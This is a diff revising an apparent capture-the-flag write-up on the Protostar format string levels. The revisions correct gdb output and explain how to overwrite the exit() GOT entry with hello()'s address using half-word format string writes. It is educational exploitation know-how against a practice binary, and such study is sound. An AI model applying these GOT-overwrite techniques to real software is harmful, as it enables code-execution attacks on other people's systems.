@@ -476,7 +476,7 @@ We will overwrite target (0x080496f4) with 0x01025544 by splitting it into two h
 1. First half-word: 0x5544 &#8594; Written to 0x080496f4
 2. Second half-word: 0x0102 &#8594; Written to 0x080496f6
 
-Since each write covers two bytes, we only need to reference two stack slots (**$12** and **$13**) instead of four.
+Since each write covers two bytes, we only need to reference two stack slots (**\$12** and **\$13**) instead of four.
 
 The trick here is that we should **start with smallest value first**, which is `0x0102`. Since we already have 8 bytes due to our memory addresses (**0x080496f4** and **0x080496f6**), the number of additional bytes we need to print for `0x080496f6` is:
 
@@ -580,36 +580,35 @@ user@protostar:/opt/protostar/bin$ objdump -t ./format4 | grep hello
 Remember that we first go to **the PLT entry**, then we can get access to **the GOT entry**. So, our goal is simple: find **the PLT entry**, disassemble it, and from there, we'll get **the GOT entry**.
 
 ```shell
-user@protostar:/opt/protostar/bin$ gdb ./format3
+user@protostar:/opt/protostar/bin$ gdb ./format4
 (gdb) set disassembly-flavor intel
 (gdb) set pagination off
 (gdb) disassemble vuln
+Dump of assembler code for function vuln:
 ...
-0x080484c9 <vuln+98>:   call   0x804837c <printf@plt>
-0x080484ce <vuln+103>:  leave
-0x080484cf <vuln+104>:  ret
+0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>
 End of assembler dump.
 ```
 
-So, `printf()` is being called through its **PLT stub** at `0x0804837c`. Let's disassemble it to see what's inside:
+So, `exit()` is being called through its **PLT stub** at `0x80483ec`. Let's disassemble it to see what's inside:
 
 ```shell
-(gdb) disassemble 0x804837c
-Dump of assembler code for function printf@plt:
-0x0804837c <printf@plt+0>:      jmp    DWORD PTR ds:0x80496d8
-0x08048382 <printf@plt+6>:      push   0x18
-0x08048387 <printf@plt+11>:     jmp    0x804833c
+(gdb) disassemble 0x80483ec
+Dump of assembler code for function exit@plt:
+0x080483ec <exit@plt+0>:        jmp    DWORD PTR ds:0x8049724
+0x080483f2 <exit@plt+6>:        push   0x30
+0x080483f7 <exit@plt+11>:       jmp    0x804837c
 End of assembler dump.
 ```
 
-The first instruction jumps to the address stored at `0x80496d8`, which means that's our **GOT entry** for `printf`. Let's examine it:
+The first instruction jumps to the address stored at `0x8049724`, which means that's our **GOT entry** for `exit`. Let's examine it:
 
 ```shell
-(gdb) x 0x80496d8
-0x80496d8 <_GLOBAL_OFFSET_TABLE_+24>:   0x08048382
+(gdb) x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483f2
 ```
 
-Right now, it points back into **the PLT section**, which is normal because of how dynamic linking works. Our goal is just overwritten `0x80496d8` **(GOT)** with the address of **hello()**, which is `0x80484b4`.
+Right now, it points back into **the PLT section**, which is normal because of how dynamic linking works. Our goal is just overwritten `0x8049724` **(GOT)** with the address of **hello()**, which is `0x80484b4`.
 
 Now, we can again use **Direct Parameter Access (DPA)**, and short-write to overwrite the address in **exit()** to address of **hello()**.
 
@@ -635,9 +634,9 @@ code execution redirected! you win
 
 ### Optimization
 
-Since the address of `exit()` function stays in ***GOT***, where it is unchanged throughout the program. This means the address of `exit()` always starts with `0x0804`, and writing it again is redundant.
+Since the ***GOT entry*** for `exit()` is unchanged throughout the program (always starts with `0x0804`), rewriting it is redundant.
 
-So, we can jump directly to the last part of our write, which is `0x84b4 = 33972`:
+We can jump directly to the last part of our write, which is `0x84b4 = 33972`:
 
 $$
 33972 - 4 = 33968
